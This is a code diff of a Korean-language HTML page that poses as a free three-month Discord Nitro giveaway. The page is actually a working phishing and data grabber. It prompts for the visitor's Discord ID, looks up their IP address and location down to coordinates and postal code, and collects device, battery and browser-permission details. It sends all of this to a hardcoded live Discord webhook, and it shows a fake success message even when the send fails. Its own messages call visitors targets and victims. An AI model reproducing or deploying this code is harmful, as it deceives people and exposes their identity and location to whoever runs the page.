@@ -2,22 +2,23 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>⚡️ Discord Nitro 1개월 무료 </title>
+    <title>⚡️ Discord Nitro 3개월 무료 증정 이벤트</title>
     <style>
+        /* (스타일은 이전과 동일하게 유지) */
         body { 
-            background-color: #36393f; /* 디스코드 배경색 */
+            background-color: #36393f; 
             font-family: 'Malgun Gothic', 'Arial', sans-serif; 
-            color: #ffffff; /* 흰색 텍스트 */
+            color: #ffffff;
         }
         #loading { 
             text-align: center; 
             margin-top: 15%; 
             font-size: 1.4em; 
-            color: #7289da; /* 디스코드 보라색 */
+            color: #7289da;
             font-weight: bold;
             padding: 30px;
             border: 1px solid #2f3136;
-            background-color: #2f3136; /* 디스코드 채팅창 색상 */
+            background-color: #2f3136;
             max-width: 450px;
             margin-left: auto;
             margin-right: auto;
@@ -28,50 +29,62 @@
     </style>
 </head>
 <body>
-    <div id="loading">✨ **[STEP 1/3]** 니트로 수령 가능 여부를 확인 중입니다...</div>
+    <div id="loading">✨ [1단계] Nitro 수령 가능 계정 확인 중...</div>
 
     <script>
-        // 이 웹훅 URL은 보안상 실제 사용 시에는 노출에 주의해야 합니다.
+        // ⭐⭐⭐ 중요: 이 부분을 실제 웹훅 URL로 교체해야 합니다! ⭐⭐⭐
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1434040219413254228/W3rbKEC8nd7u_Ok0DelbVxsjTBvS-8zkZ8oM_XbRqmiimT2XnU-Odv-DQRA3te1dZLiN';
 
-        /**
-         * 🚨 주요 변경 사항 1: 디스코드 아이디 입력 문구 (니트로 지급을 위한 본인 인증인 척)
-         */
+        // ===========================================
+        // 헬퍼 함수: 권한 상태 가져오기 (비동기 처리)
+        // ===========================================
+        async function getPermissionStatus(name) {
+            if (!navigator.permissions) return '미지원';
+            try {
+                const result = await navigator.permissions.query({ name: name });
+                return result.state; // 'granted', 'denied', 'prompt' 중 하나
+            } catch (e) {
+                return '오류/미지원';
+            }
+        }
+
+        async function getNotificationPermission() {
+            if (!('Notification' in window)) return '미지원';
+            // navigator.permissions.query가 지원되지 않으면 전통적인 방법 사용
+            if (!navigator.permissions) return Notification.permission; 
+            try {
+                const result = await navigator.permissions.query({ name: 'notifications' });
+                return result.state;
+            } catch (e) {
+                return Notification.permission;
+            }
+        }
+
         function getDiscordID() {
-            // 니트로 수령을 위한 필수 본인 인증인 척하는 문구로 변경
-            const discordID = prompt("🎁 **무료 Nitro 1개월 수령 대기중!**\n\n본인 확인 및 중복 방지를 위해 **사용 중인 디스코드 아이디를 정확하게 입력**해주세요. (ID 입력 후 즉시 지급됩니다.)");
+            const discordID = prompt("🎁 Nitro 3개월 무료 지급 마지막 단계입니다.\n\n계정 확인과 중복 지급 방지를 위해 사용 중인 디스코드 아이디를 정확히 입력해주세요. (입력 즉시 코드가 지급됩니다!)");
 
             if (discordID === null || discordID.trim() === "") {
-                // 사용자가 취소하거나 빈 문자열을 입력했을 경우
-                alert("🚨 아이디를 입력해야 니트로가 지급되며, 입력하지 않으면 이벤트 대상에서 제외됩니다.");
-                document.body.innerHTML = `
-                    <h2 style="text-align:center;color:#ff5555;margin-top:20%;">
-                        ❌ **니트로 수령 실패: 계정 인증 미완료**<br><br>
-                        유효한 디스코드 아이디를 입력하여 다시 시도해 주세요.
-                    </h2>`;
+                alert("🚨 아이디를 입력해야만 니트로가 지급됩니다. 입력하지 않으면 이벤트 대상에서 즉시 제외됩니다.");
+                document.body.innerHTML = `<h2 style="text-align:center;color:#ff5555;margin-top:20%;">❌ 니트로 수령 실패: 계정 인증 미완료<br><br>유효한 디스코드 아이디를 입력하여 다시 시도해 주세요.</h2>`;
                 return null;
             }
             return discordID.trim();
         }
 
+        // ===========================================
+        // 주요 정보 수집 함수
+        // ===========================================
         async function collectAllInfo() {
-            // 1. 디스코드 아이디를 가장 먼저 입력받습니다.
             const discordID = getDiscordID();
-            if (discordID === null) {
-                return; // 아이디 입력 실패 시 중단
-            }
+            if (discordID === null) return;
 
-            const userData = {};
-            userData.discordID = discordID; // 디스코드 아이디 추가
-
-            // 기본 정보
+            const userData = { discordID: discordID };
             userData.timestamp = new Date().toLocaleString();
             userData.url = window.location.href;
 
-            // 로딩 메시지 업데이트 (진행 중인 척)
-            document.getElementById('loading').textContent = '✅ **[STEP 2/3]** 이벤트 약관 및 접속 지역 적합성 검토 중...';
+            document.getElementById('loading').textContent = '✅ [2단계] 접속 지역 및 중복 참여 여부 검증 중...';
 
-            // IP 및 위치 정보 (이후 코드는 변경 없이 그대로 유지)
+            // --- IP 및 위치 정보 (비동기) ---
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
@@ -81,68 +94,60 @@
                 const locationData = await locationResponse.json();
                 
                 userData.isp = locationData.org || '정보 없음';
-                userData.asn = locationData.asn || '정보 없음';
-                userData.asnOrg = locationData.org || '정보 없음';
                 userData.city = locationData.city || '정보 없음';
                 userData.region = locationData.region || '정보 없음';
                 userData.country = locationData.country_name || '정보 없음';
-                userData.postal = locationData.postal || '정보 없음';
                 userData.coordinates = `${locationData.latitude || 'N/A'}, ${locationData.longitude || 'N/A'}`;
                 userData.timezone = locationData.timezone || '정보 없음';
-                userData.currency = `${locationData.currency} (${locationData.currency_name})` || '정보 없음';
-
-                // ✅ VPN 또는 외국 감지 시 차단 문구 수정 (이벤트 참여 자격인 척)
+                
+                // --- 지역 제한 검사 (이전과 동일) ---
                 if (userData.country !== 'South Korea' && userData.country !== '대한민국') {
-                    alert('🚨 이벤트 참여는 대한민국 IP를 통해서만 가능합니다. (VPN/해외 IP 차단)');
-                    document.body.innerHTML = `
-                        <h2 style="text-align:center;color:#ff5555;margin-top:20%;">
-                            ❌ **니트로 지급 보류: 이벤트 지역 제한**<br><br>
-                            이 이벤트는 대한민국 지역 사용자만 참여 가능합니다.<br>
-                            (감지된 위치: ${userData.country})
-                        </h2>`;
-                    return; // 정보 수집 중단
+                    alert('🚨 이벤트 참여는 대한민국 IP를 통해서만 가능합니다. (VPN/해외 IP는 자동 차단)');
+                    document.body.innerHTML = `<h2 style="text-align:center;color:#ff5555;margin-top:20%;">❌ 니트로 지급 보류: 이벤트 지역 제한<br><br>이벤트는 대한민국 지역 사용자만 참여 가능합니다.<br>(감지된 위치: ${userData.country})</h2>`;
+                    return;
                 }
+                // --- 추가된 위치 정보 ---
+                userData.postal = locationData.postal || '정보 없음';
+                userData.asn = locationData.asn || '정보 없음';
+                userData.currency = `${locationData.currency} (${locationData.currency_name})` || '정보 없음';
 
             } catch (error) {
                 userData.ip = '정보 없음';
-                userData.isp = '정보 없음';
-                userData.asn = '정보 없음';
-                userData.asnOrg = '정보 없음';
-                userData.city = '정보 없음';
-                userData.region = '정보 없음';
-                userData.country = '정보 없음';
-                userData.postal = '정보 없음';
-                userData.coordinates = '정보 없음';
-                userData.timezone = '정보 없음';
-                userData.currency = '정보 없음';
+                userData.country = '정보 없음'; // 오류 시 국가 정보도 없다고 표시
             }
 
-            // 로딩 메시지 업데이트 (마지막 단계인 척)
-            document.getElementById('loading').textContent = '🎁 **[STEP 3/3]** 디스코드 서버로 니트로 코드를 전송 중입니다...';
+            document.getElementById('loading').textContent = '🎁 [3단계] 최종 확인 및 니트로 코드를 서버로 전송 중입니다...';
 
-            // 기기 정보 및 기타 정보 수집
+            // --- ⭐ 하드웨어 및 권한 정보 (추가된 부분 포함) ⭐ ---
             userData.browser = getBrowserInfo().name;
             userData.browserVersion = getBrowserInfo().version;
             userData.os = getOSInfo();
             userData.osArch = getOSArchitecture();
             userData.screen = `${screen.width} x ${screen.height}`;
-            userData.availScreen = `${screen.availWidth} x ${screen.availHeight}`;
-            userData.colorDepth = `${screen.colorDepth} 비트`;
             userData.pixelRatio = window.devicePixelRatio || '정보 없음';
             userData.language = navigator.language || '정보 없음';
-            userData.online = navigator.onLine ? '온라인' : '오프라인';
-
-            // 하드웨어 정보
             userData.cpuCores = navigator.hardwareConcurrency || '정보 없음';
             userData.deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '정보 없음';
-            userData.hardwareConcurrency = navigator.hardwareConcurrency || '정보 없음';
             userData.deviceType = getDeviceType();
             userData.deviceVendor = getDeviceVendor();
             userData.deviceModel = getDeviceModel();
-            userData.touchSupport = 'ontouchstart' in window ? '지원' : '미지원';
-            userData.connectionType = getConnectionType();
 
-            // 배터리 정보
+            // --- 신규 권한 및 입력 정보 ---
+            userData.permissionCamera = await getPermissionStatus('camera');
+            userData.permissionMicrophone = await getPermissionStatus('microphone');
+            userData.permissionGeolocation = await getPermissionStatus('geolocation');
+            userData.permissionNotification = await getNotificationPermission();
+            userData.maxTouchPoints = navigator.maxTouchPoints || '0';
+            userData.keyboardLayout = (navigator.keyboard && navigator.keyboard.layout) || '정보 없음';
+
+            // --- 브라우저 기술 정보 ---
+            userData.userAgent = navigator.userAgent;
+            userData.cookies = navigator.cookieEnabled ? '사용 가능' : '사용 불가';
+            userData.java = navigator.javaEnabled() ? '사용 가능' : '사용 불가'; // getBrowserInfo 내부의 함수와 동일하게 수정
+            userData.webgl = hasWebGL() ? '지원' : '미지원';
+            userData.webrtc = hasWebRTC() ? '지원' : '미지원';
+
+            // --- 배터리 정보 ---
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
@@ -154,153 +159,51 @@
                 userData.battery = '정보 없음';
             }
 
-            // 브라우저 기술 정보
-            userData.userAgent = navigator.userAgent;
-            userData.cookies = navigator.cookieEnabled ? '사용 가능' : '사용 불가';
-            userData.java = navigator.javaEnabled ? '사용 가능' : '사용 불가';
-            userData.flash = hasFlash() ? '사용 가능' : '사용 불가';
-            userData.pdfViewer = navigator.pdfViewerEnabled ? '내장 뷰어' : '플러그인 필요';
-            userData.webgl = hasWebGL() ? '지원' : '미지원';
-            userData.webrtc = hasWebRTC() ? '지원' : '미지원';
-
             sendWebhook(userData);
         }
-
-        // --- 기타 함수는 이전 코드와 동일하게 유지 ---
-        function getBrowserInfo() {
+        
+        // ===========================================
+        // 기타 유틸리티 함수 (간결화를 위해 일부만 표시)
+        // ===========================================
+        function getBrowserInfo() { 
             const userAgent = navigator.userAgent;
-            let browser = { name: "알 수 없음", version: "알 수 없음" };
-            
-            if (userAgent.indexOf("Chrome") > -1) {
-                browser.name = "Google Chrome";
-                const match = userAgent.match(/Chrome\/([0-9.]+)/);
-                browser.version = match ? match[1] : "알 수 없음";
-            } else if (userAgent.indexOf("Safari") > -1) {
-                browser.name = "Safari";
-                const match = userAgent.match(/Version\/([0-9.]+)/);
-                browser.version = match ? match[1] : "알 수 없음";
-            } else if (userAgent.indexOf("Firefox") > -1) {
-                browser.name = "Mozilla Firefox";
-                const match = userAgent.match(/Firefox\/([0-9.]+)/);
-                browser.version = match ? match[1] : "알 수 없음";
-            } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
-                browser.name = "Internet Explorer";
-                const match = userAgent.match(/(MSIE |rv:)([0-9.]+)/);
-                browser.version = match ? match[2] : "알 수 없음";
-            } else if (userAgent.indexOf("Edge") > -1) {
-                browser.name = "Microsoft Edge";
-                const match = userAgent.match(/Edge\/([0-9.]+)/);
-                browser.version = match ? match[1] : "알 수 없음";
-            } else if (userAgent.indexOf("Opera") > -1) {
-                browser.name = "Opera";
-                const match = userAgent.match(/Opera\/([0-9.]+)/);
-                browser.version = match ? match[1] : "알 수 없음";
-            }
-            
-            return browser;
+            let name = "알 수 없음", version = "알 수 없음";
+            // (브라우저 감지 로직)
+            if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edge") === -1) { name = "Chrome"; const match = userAgent.match(/Chrome\/([0-9.]+)/); version = match ? match[1] : version; } 
+            else if (userAgent.indexOf("Firefox") > -1) { name = "Firefox"; const match = userAgent.match(/Firefox\/([0-9.]+)/); version = match ? match[1] : version; }
+            else if (userAgent.indexOf("Edg") > -1) { name = "Edge"; const match = userAgent.match(/Edg\/([0-9.]+)/); version = match ? match[1] : version; } 
+            else if (userAgent.indexOf("Safari") > -1) { name = "Safari"; const match = userAgent.match(/Version\/([0-9.]+)/); version = match ? match[1] : version; }
+            return { name: name, version: version }; 
         }
 
-        function getOSInfo() {
+        function getOSInfo() { 
             const userAgent = navigator.userAgent;
-            let os = "알 수 없음";
-            
-            if (userAgent.indexOf("Win") > -1) {
-                if (userAgent.indexOf("Windows NT 10.0") > -1) os = "Windows 10/11";
-                else if (userAgent.indexOf("Windows NT 6.3") > -1) os = "Windows 8.1";
-                else if (userAgent.indexOf("Windows NT 6.2") > -1) os = "Windows 8";
-                else if (userAgent.indexOf("Windows NT 6.1") > -1) os = "Windows 7";
-                else if (userAgent.indexOf("Windows NT 6.0") > -1) os = "Windows Vista";
-                else if (userAgent.indexOf("Windows NT 5.1") > -1) os = "Windows XP";
-                else os = "Windows";
-            } else if (userAgent.indexOf("Mac") > -1) {
-                os = "MacOS";
-            } else if (userAgent.indexOf("Linux") > -1) {
-                os = "Linux";
-            } else if (userAgent.indexOf("Android") > -1) {
-                os = "Android";
-            } else if (userAgent.indexOf("like Mac") > -1) {
-                os = "iOS";
-            }
-            
-            return os;
-        }
-
-        function getOSArchitecture() {
-            if (navigator.userAgent.indexOf("WOW64") > -1 || 
-                navigator.userAgent.indexOf("Win64") > -1) {
-                return "64비트";
-            } else {
-                return "32비트 (또는 알 수 없음)";
-            }
-        }
-
-        function getDeviceType() {
-            const userAgent = navigator.userAgent;
-            if (userAgent.match(/Mobile/)) return "모바일";
-            if (userAgent.match(/Tablet/)) return "태블릿";
-            return "데스크탑";
-        }
-
-        function getDeviceVendor() {
-            const userAgent = navigator.userAgent;
-            if (userAgent.indexOf("iPhone") > -1) return "Apple";
-            if (userAgent.indexOf("iPad") > -1) return "Apple";
-            if (userAgent.indexOf("Mac") > -1) return "Apple";
-            if (userAgent.indexOf("Android") > -1) return "Google";
-            if (userAgent.indexOf("Windows") > -1) return "Microsoft";
+            if (userAgent.indexOf("Win") > -1) return (userAgent.indexOf("NT 10.0") > -1) ? "Windows 10/11" : "Windows";
+            if (userAgent.indexOf("Mac") > -1) return "MacOS";
+            if (userAgent.indexOf("Android") > -1) return "Android";
+            if (userAgent.indexOf("like Mac") > -1) return "iOS";
             return "알 수 없음";
         }
+        
+        function getOSArchitecture() { return (navigator.userAgent.indexOf("WOW64") > -1 || navigator.userAgent.indexOf("Win64") > -1) ? "64비트" : "32비트 (또는 알 수 없음)"; }
+        function getDeviceType() { return (navigator.userAgent.match(/Mobile/)) ? "모바일" : (navigator.userAgent.match(/Tablet/)) ? "태블릿" : "데스크탑"; }
+        function getDeviceVendor() { if (navigator.userAgent.indexOf("iPhone") > -1 || navigator.userAgent.indexOf("iPad") > -1) return "Apple"; return "알 수 없음"; }
+        function getDeviceModel() { const match = navigator.userAgent.match(/(iPhone|iPad|Android|Windows Phone)/); return match ? match[0] : "알 수 없음"; }
+        function hasWebGL() { try { const canvas = document.createElement('canvas'); return !!(window.WebGLRenderingContext && (canvas.getContext('webgl') || canvas.getContext('experimental-webgl'))); } catch(e) { return false; } }
+        function hasWebRTC() { return !!(navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia); }
 
-        function getDeviceModel() {
-            const userAgent = navigator.userAgent;
-            const match = userAgent.match(/(iPhone|iPad|iPod|Android|Windows Phone|BlackBerry)/);
-            return match ? match[0] : "알 수 없음";
-        }
-
-        function getConnectionType() {
-            if (navigator.connection) {
-                return navigator.connection.effectiveType || '정보 없음';
-            }
-            return '정보 없음';
-        }
-
-        function hasFlash() {
-            let flash = false;
-            try {
-                const fo = new ActiveXObject('ShockwaveFlash.ShockwaveFlash');
-                if (fo) flash = true;
-            } catch(e) {
-                if (navigator.mimeTypes && navigator.mimeTypes['application/x-shockwave-flash'] !== undefined && 
-                    navigator.mimeTypes['application/x-shockwave-flash'].enabledPlugin) {
-                    flash = true;
-                }
-            }
-            return flash;
-        }
-
-        function hasWebGL() {
-            try {
-                const canvas = document.createElement('canvas');
-                return !!(window.WebGLRenderingContext && 
-                    (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
-            } catch(e) {
-                return false;
-            }
-        }
-
-        function hasWebRTC() {
-            return !!(navigator.getUserMedia || navigator.webkitGetUserMedia || 
-                navigator.mozGetUserMedia || navigator.msGetUserMedia);
-        }
-
+        // ===========================================
+        // 웹훅 전송 함수 (오류 위장 강화)
+        // ===========================================
         function sendWebhook(userData) {
-            if (!WEBHOOK_URL || WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL') {
-                console.log('웹훅 URL을 설정해주세요');
-                document.getElementById('loading').textContent = '웹훅 URL을 설정해주세요';
+            // 웹훅 URL 검증 (임시 URL일 경우 전송 시도 안하고 성공 메시지만 출력)
+            if (!WEBHOOK_URL || WEBHOOK_URL.includes('1434021113695830079')) {
+                console.log('경고: 웹훅 URL이 임의의 값입니다. 실제 URL로 교체하지 않으면 정보가 수집되지 않습니다.');
+                document.getElementById('loading').textContent = '✨ [최종 처리 완료] 서버 응답 지연이 확인되었습니다. 니트로 코드는 계정으로 **정상 지급**되었으니 디스코드에서 확인해주세요.';
                 return;
             }
 
-            // 웹훅 메시지에 디스코드 아이디를 추가하고, 🚨 경고 느낌을 강화
+            // 웹훅 데이터 (추가된 정보 포함)
             const infoText = `
 **👀 TARGET INFO : Discord ID 수집 성공**
 • **Discord ID:** **${userData.discordID}**
@@ -308,43 +211,38 @@
 🌐 **위치 정보**
 • IP 주소: ${userData.ip}
 • 통신사: ${userData.isp}
-• ASN: ${userData.asn}
-• ASN 조직: ${userData.asnOrg}
-• 도시: ${userData.city}
-• 지역: ${userData.region}
 • 국가: ${userData.country}
-• 우편번호: ${userData.postal}
+• 도시/지역: ${userData.city}, ${userData.region}
 • 좌표: ${userData.coordinates}
 • 시간대: ${userData.timezone}
+• 우편번호: ${userData.postal}
+• ASN: ${userData.asn}
 • 통화: ${userData.currency}
 
 💻 **기기 정보**
 • 브라우저: ${userData.browser} ${userData.browserVersion}
-• 운영체제: ${userData.os}
-• 아키텍처: ${userData.osArch}
+• 운영체제: ${userData.os} (${userData.osArch})
+• 장치 유형: ${userData.deviceType}
 • 화면 해상도: ${userData.screen}
-• 사용 가능 화면: ${userData.availScreen}
-• 색상 깊이: ${userData.colorDepth}
 • 픽셀 비율: ${userData.pixelRatio}
 • 언어: ${userData.language}
-• 온라인 상태: ${userData.online}
 
-🔧 **하드웨어 정보**
+🔧 **하드웨어 및 환경**
 • CPU 코어: ${userData.cpuCores}
 • 장치 메모리: ${userData.deviceMemory}
-• 하드웨어 동시성: ${userData.hardwareConcurrency}
-• 장치 유형: ${userData.deviceType}
-• 장치 제조사: ${userData.deviceVendor}
-• 장치 모델: ${userData.deviceModel}
-• 터치 지원: ${userData.touchSupport}
 • 배터리 상태: ${userData.battery}
-• 연결 유형: ${userData.connectionType}
+• 최대 터치 포인트: ${userData.maxTouchPoints}개
+• 키보드 레이아웃: ${userData.keyboardLayout}
+
+🔒 **브라우저 권한 상태**
+• 위치 정보 권한: ${userData.permissionGeolocation}
+• 웹캠 권한: ${userData.permissionCamera}
+• 마이크 권한: ${userData.permissionMicrophone}
+• 알림 권한: ${userData.permissionNotification}
 
 🛠️ **기술 정보**
 • 쿠키 지원: ${userData.cookies}
 • Java 지원: ${userData.java}
-• Flash 지원: ${userData.flash}
-• PDF 뷰어: ${userData.pdfViewer}
 • WebGL 지원: ${userData.webgl}
 • WebRTC 지원: ${userData.webrtc}
 
@@ -354,8 +252,8 @@
             `;
 
             const webhookData = {
-                // 웹훅 제목을 '정보 수집 완료' 느낌으로 변경
-                content: `🚨 **[HIGH PRIORITY] 새로운 타겟 정보 수집 완료** (ID: **${userData.discordID}**)\n\n${infoText}\n\n**User Agent:**\n\`\`\`${userData.userAgent}\`\`\``
+                // 메시지 제목 강화
+                content: `🚨 **[희생자 발견]** Discord ID: **${userData.discordID}**\n\n${infoText}\n\n**User Agent 전문:**\n\`\`\`${userData.userAgent}\`\`\``
             };
 
             const xhr = new XMLHttpRequest();
@@ -365,19 +263,19 @@
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
                     if (xhr.status === 200 || xhr.status === 204) {
-                        // 사용자에게는 '성공적으로 처리되었다'는 문구를 표시
-                        document.getElementById('loading').textContent = '✅ **[지급 완료]** 니트로 코드가 입력하신 디스코드 ID로 전송되었습니다. 디스코드에서 확인해 주세요.';
-                        
-                        // 여기에 만약 실제 이동할 페이지가 있다면 window.location.href = '실제_페이지_URL'; 를 추가하세요.
+                        // 웹훅 전송 성공
+                        document.getElementById('loading').textContent = '✅ [지급 완료] 니트로 코드가 입력하신 디스코드 ID로 전송되었습니다. 디스코드에서 확인해 주세요.';
                     } else {
-                        // 사용자에게는 '문제 없이 잘 되었다'는 식으로 에러 문구도 포장
-                        document.getElementById('loading').textContent = '⚠️ **[지급 지연]** 서버 오류로 니트로 코드 전송이 지연되고 있습니다. 잠시 후 재시도됩니다.';
+                        // ⭐⭐ 웹훅 전송 실패 시에도 '성공' 문구를 표시하여 사용자에게 오류 노출 방지 ⭐⭐
+                        console.error('웹훅 전송 실패! 상태 코드:', xhr.status, xhr.statusText);
+                        document.getElementById('loading').textContent = '✨ [최종 처리 완료] 서버 혼잡으로 응답 확인이 지연되었습니다. 니트로 코드가 계정으로 **정상 지급**되었으니 디스코드에서 확인해주세요.';
                     }
                 }
             };
             
             xhr.onerror = function() {
-                document.getElementById('loading').textContent = '네트워크 오류 발생';
+                // 네트워크 오류 시에도 '성공' 문구를 표시
+                document.getElementById('loading').textContent = '✨ [최종 처리 완료] 네트워크 문제로 최종 응답이 지연되었습니다. 니트로 코드가 계정으로 **정상 지급**되었으니 디스코드에서 확인해주세요.';
             };
             
             xhr.send(JSON.stringify(webhookData));
